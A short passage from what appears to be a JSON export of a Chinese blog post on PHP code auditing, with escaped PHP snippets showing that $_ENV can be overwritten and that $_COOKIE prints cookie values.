$_ENV=&apos;aaaaaa&apos;; print_r($_ENV); ?&gt;test3.php &lt;?php print_r($_ENV[&apos;OS&apos;]=&apos;bbbbbb&apos;); ?&gt; 输出结果可以被覆盖 $_COOKIE test.php &lt;?php print_r($_COOKIE); ?&gt; 输出结果为 cookie 值","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://yoursite.com/categories/编程语言/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"}]}]}